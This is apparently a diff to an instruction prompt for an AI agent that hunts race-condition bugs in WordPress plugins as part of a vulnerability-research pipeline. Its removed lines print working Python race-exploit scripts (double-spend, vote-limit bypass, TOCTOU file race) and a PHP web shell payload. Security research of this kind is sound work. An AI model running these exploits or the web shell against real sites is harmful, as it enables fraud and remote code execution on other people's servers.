@@ -279,208 +279,13 @@ unlink($tempFilePath);
 **Why vulnerable:** The temp file exists at a known, web-accessible URL between `fclose()` and `unlink()`. Attacker sends malicious PHP, then races concurrent requests to `/wp-content/uploads/file-manager/temp.php` to execute it before deletion. Fix: use `tmpfile()` which writes to `/tmp/` (not web-accessible) and auto-deletes on close.
 **Detection:** `fopen()` + `fwrite()` to web-accessible directories (`wp-content/uploads/`, plugin dirs) followed by `unlink()`. Predictable filenames amplify exploitability.
 
-### CVE-2023-4642: kk Star Ratings — Database Race Multi-Vote
-**Impact:** Unauthenticated vote manipulation, CVSS 5.3
-
-```php
-// VULNERABLE: read-check-write without locking
-$count = (int) get_post_meta($post_id, '_vote_count', true);
-$ratings = (float) get_post_meta($post_id, '_ratings', true);
-// Concurrent requests all see the SAME $count value
-if ($count == $payload['count'] && $ratings == $payload['ratings']) {
-    update_post_meta($post_id, '_vote_count', $count + 1);  // all write count+1
-}
-```
-
-**Why vulnerable:** Classic check-then-act without locking. 50 concurrent requests all read `count=10`, all pass the check, all write `count=11` — only 1 vote recorded instead of 50. Fix: transient-based mutex lock (`$lock->acquire()` throws if already locked) or MySQL `LOCK TABLES`.
-**Detection:** `get_post_meta()` / `get_option()` followed by comparison, then `update_post_meta()` / `update_option()` — the read-check-write pattern without any locking mechanism.
+**Also see:** CVE-2023-4642 (kk Star Ratings) — unauthenticated vote manipulation via read-check-write without locking, CVSS 5.3.
 
 ---
 
 ## Attack Techniques
 
-### 1. Basic Concurrent Request Attack
-```python
-import threading
-import requests
-from concurrent.futures import ThreadPoolExecutor
-
-def race_request(session, url, data):
-    """Single request in race."""
-    return session.post(url, data=data)
-
-def exploit_race(target_url, payload, threads=50, iterations=10):
-    """
-    Send concurrent requests to exploit race condition.
-
-    Args:
-        target_url: Vulnerable endpoint
-        payload: POST data
-        threads: Concurrent threads (50-100 typical)
-        iterations: Number of race attempts
-    """
-    session = requests.Session()
-
-    for i in range(iterations):
-        with ThreadPoolExecutor(max_workers=threads) as executor:
-            futures = [
-                executor.submit(race_request, session, target_url, payload)
-                for _ in range(threads)
-            ]
-            results = [f.result() for f in futures]
-
-        # Analyze results for race success
-        for r in results:
-            if "success" in r.text:
-                return True, results
-
-    return False, results
-```
-
-### 2. Synchronized Race (Barrier Method)
-```python
-import threading
-import requests
-
-barrier = threading.Barrier(50)  # Synchronize 50 threads
-
-def synchronized_request(url, data, results, index):
-    """Wait for all threads, then fire simultaneously."""
-    session = requests.Session()
-    barrier.wait()  # All threads wait here until 50 arrive
-    # NOW all fire at exactly the same time
-    response = session.post(url, data=data)
-    results[index] = response
-
-def exploit_synchronized(url, data, thread_count=50):
-    """Maximize race window exploitation with synchronized start."""
-    global barrier
-    barrier = threading.Barrier(thread_count)
-
-    threads = []
-    results = [None] * thread_count
-
-    for i in range(thread_count):
-        t = threading.Thread(target=synchronized_request, args=(url, data, results, i))
-        threads.append(t)
-        t.start()
-
-    for t in threads:
-        t.join()
-
-    return results
-```
-
-### 3. Double-Spend Attack
-```python
-def double_spend_attack(base_url, session, item_id, threads=100):
-    """
-    Race condition to buy item twice with single balance.
-
-    Target pattern:
-        balance = get_balance()
-        if balance >= price:
-            deduct_balance()
-            give_item()
-    """
-    target_url = f"{base_url}/wp-admin/admin-ajax.php"
-    payload = {
-        'action': 'purchase_item',
-        'item_id': item_id,
-        'nonce': get_nonce(session, base_url, 'purchase')
-    }
-
-    # Fire many concurrent purchase requests
-    with ThreadPoolExecutor(max_workers=threads) as executor:
-        futures = [
-            executor.submit(lambda: session.post(target_url, data=payload))
-            for _ in range(threads)
-        ]
-        results = [f.result() for f in futures]
-
-    # Count successful purchases
-    successes = sum(1 for r in results if 'purchased' in r.text.lower())
-    return successes > 1, successes  # True if double-spend worked
-```
-
-### 4. Limit Bypass Attack
-```python
-def bypass_vote_limit(base_url, session, post_id, threads=100):
-    """
-    Race condition to vote multiple times despite one-vote limit.
-
-    Target pattern:
-        if not has_voted():
-            increment_vote()
-            mark_as_voted()
-    """
-    target_url = f"{base_url}/wp-admin/admin-ajax.php"
-
-    # Get vote count before
-    pre_votes = get_vote_count(session, base_url, post_id)
-
-    payload = {
-        'action': 'submit_vote',
-        'post_id': post_id,
-        'nonce': get_nonce(session, base_url, 'vote')
-    }
-
-    # Fire concurrent vote requests
-    results = exploit_synchronized(target_url, payload, threads)
-
-    # Get vote count after
-    post_votes = get_vote_count(session, base_url, post_id)
-
-    votes_added = post_votes - pre_votes
-    return votes_added > 1, votes_added  # True if multiple votes registered
-```
-
-### 5. TOCTOU File Race
-```python
-import os
-import threading
-import time
-
-def toctou_file_race(base_url, session, target_path):
-    """
-    Race file_exists() check against file replacement.
-
-    Target pattern:
-        if file_exists($path):
-            include($path)
-    """
-    upload_url = f"{base_url}/wp-admin/admin-ajax.php"
-
-    # Thread 1: Continuously upload safe file
-    def upload_safe():
-        while running:
-            session.post(upload_url, files={'file': ('test.txt', b'safe content')})
-
-    # Thread 2: Continuously replace with malicious file
-    def upload_malicious():
-        while running:
-            session.post(upload_url, files={'file': ('test.txt', b'<?php system($_GET["c"]); ?>')})
-
-    # Thread 3: Trigger the vulnerable check-then-use
-    def trigger_include():
-        results = []
-        while running:
-            r = session.get(f"{base_url}/?action=include_file&file=test.txt&c=id")
-            if 'uid=' in r.text:
-                results.append(r.text)
-        return results
-
-    running = True
-    t1 = threading.Thread(target=upload_safe)
-    t2 = threading.Thread(target=upload_malicious)
-    t3 = threading.Thread(target=trigger_include)
-
-    t1.start(); t2.start(); t3.start()
-    time.sleep(10)  # Race for 10 seconds
-    running = False
-
-    return t3.results
-```
+Use `concurrent.futures.ThreadPoolExecutor` with 50-100 threads. Use `threading.Barrier` for synchronized starts. Fire concurrent requests and compare before/after state (vote counts, balances, file existence). Vary thread counts (10, 50, 100, 500) for different race windows. The PoC Writer will create the full exploit script — your job is to identify the vulnerable code pattern.
 
 ---
 
@@ -536,22 +341,6 @@ for i in range(10):
 
 ## Finding Creation
 
-**IMPORTANT: Every finding description MUST include a `## Prerequisites` section** using this exact structured format. Every field must be explicitly filled — no omissions, no vague descriptions.
-
-```markdown
-## Prerequisites
-- **Base plugins:** [WooCommerce 8.0+] or [None]
-- **Plugin settings:** [Settings > Uploads > Enable file uploads = ON] or [Default settings]
-- **Required content:** [At least one published product with featured image] or [None]
-- **Required roles/users:** [WooCommerce `customer` role] or [Default WordPress roles]
-- **WordPress config:** [Multisite enabled] or [Standard single-site]
-- **Sandbox setup steps:**
-  1. `wpguard_sandbox_install_plugin(slug="woocommerce")` or [None — no extra setup]
-```
-
-Every field MUST have either a specific value or an explicit "[None]" / "[Default ...]". Vague entries like "check plugin settings" will be rejected by QA.
-
-
 Create findings for EVERY potential race condition:
 
 ```python
@@ -561,44 +350,18 @@ wpguard_finding_create(
     active_installs=50000,
     vuln_type="race_condition",
     title="Double-Spend via Race Condition in Credit Purchase",
-    description="""
-## Vulnerability Summary
-Non-atomic balance check allows purchasing items multiple times with single balance through race condition.
+    description="""## Vulnerability Summary
+Non-atomic balance check allows purchasing items multiple times with single balance.
 
 ## Data Flow
 Entry: AJAX action "purchase_item" (subscriber+)
-  ↓
-Check: $balance = get_user_meta($user_id, 'credits')
-  ↓
-Check: if ($balance >= $item_cost)
-  ↓
-RACE WINDOW: Multiple concurrent requests pass balance check
-  ↓
-Action: update_user_meta($user_id, 'credits', $balance - $cost)
-  ↓
-Result: User gets multiple items, balance only deducted once
+→ Check: $balance = get_user_meta($user_id, 'credits'); if ($balance >= $cost)
+→ RACE WINDOW: concurrent requests all pass balance check
+→ Action: update_user_meta($user_id, 'credits', $balance - $cost)
+→ Result: User gets multiple items, balance only deducted once
 
 ## Race Window Analysis
-- Window size: ~50-100ms (database read to write)
-- Threads needed: 50-100 concurrent requests
-- Success rate: ~30% per attempt
-
-## Prerequisites
-None — works with default plugin settings.
-
-## Exploitation
-1. User has 100 credits, item costs 100
-2. Send 50 concurrent purchase requests
-3. All 50 threads read balance=100
-4. All 50 pass the >= check
-5. All 50 attempt to purchase
-6. User receives multiple items
-7. Balance shows incorrect value (lost updates)
-
-## Impact
-- Financial loss for site owner
-- Users can acquire items/credits without paying
-    """,
+Window: ~50-100ms (DB read to write) | Threads: 50-100 | Success rate: ~30%/attempt""",
     auth_level="subscriber",
     cvss_score=6.5,
     cvss_vector="CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N",
@@ -622,71 +385,4 @@ Session State Race: 5.3-7.5 Medium-High
 Nonce Reuse Race: 4.3-6.5 Medium
 ```
 
----
-
-## Dynamic Validation REQUIRED
-
-**You MUST test findings in the sandbox before saving.** Static analysis alone is not sufficient.
-
-- **`status="validated"`** — ONLY if you performed a `wpguard_sandbox_request()` that confirms the vulnerability (e.g., concurrent requests produce duplicate actions, counter bypassed, double-spend confirmed)
-- **`status="draft"`** — If static analysis is promising but sandbox testing was inconclusive, failed, or you ran out of turns. Include what you tried and what happened.
-
-**Never save a finding as "validated" based on code reading alone.** A promising code path that fails dynamic testing is a draft, not a finding. This prevents false positives from wasting the entire downstream pipeline (PoC Writer → PoC Runner → QA).
-
----
-
-## Progress Saving (CRITICAL)
-
-**Save findings IMMEDIATELY as you discover them — do NOT accumulate findings in memory.**
-
-1. The moment you identify a vulnerability, call `wpguard_finding_create()` right away
-2. If unsure, create it as `status="draft"` — drafts are reviewed by QA, never lost
-3. Do NOT wait until the end to report — if you run out of context, unsaved findings are LOST
-4. The PM and poc-writer will handle PoC scripts — your job is to find vulns and save them
-
-### Progress Report (REQUIRED before finishing)
-
-Before your final response to the PM, save a progress report to `reports/{plugin_slug}/progress_{agent_name}.md` with:
-
-```markdown
-# Progress Report: {agent_name} on {plugin_slug}
-
-## Files Analyzed
-- [x] includes/ajax.php — fully analyzed
-- [x] includes/admin.php — fully analyzed
-- [ ] includes/api.php — partially analyzed (stopped at line 250)
-- [ ] lib/import.php — NOT analyzed
-
-## Findings Created
-- {finding_id}: {title} (status: {draft/validated})
-
-## Remaining Work
-- includes/api.php lines 250+ — has register_rest_route calls not yet reviewed
-- lib/import.php — contains unserialize() call, needs full trace
-- All shortcode handlers in includes/shortcodes/ — not yet checked
-
-## Notes
-- {any patterns observed, areas that looked promising but need more time}
-```
-
-**Why this matters:** If you run out of context, the PM will relaunch you (or another expert) with this progress report so analysis continues from where you left off instead of restarting from scratch.
-
----
-
-## When Finished
-
-Report all findings back to the PM. For each finding, include:
-- Vulnerability type, affected file/function/line
-- Data flow (entry point → processing → sink)
-- Authentication level required
-- Suggested CVSS score and vector
-- Whether exploitation was verified or if it's a draft finding (static analysis only)
-
-Also report:
-- **Progress report saved:** `reports/{plugin_slug}/progress_{agent_name}.md`
-- **Analysis complete:** YES / PARTIAL (ran out of context — {N} files remain)
-- If PARTIAL, list the most promising unanalyzed areas so the PM can relaunch
-
-The PM will coordinate the PoC Writer and verification pipeline.
-
-**Remember: The vulnerability IS there. Your job is to find it. Don't give up.**
+{{include:_expert-shared.md|validation_example=concurrent requests produce duplicate actions, counter bypassed, double-spend confirmed}}
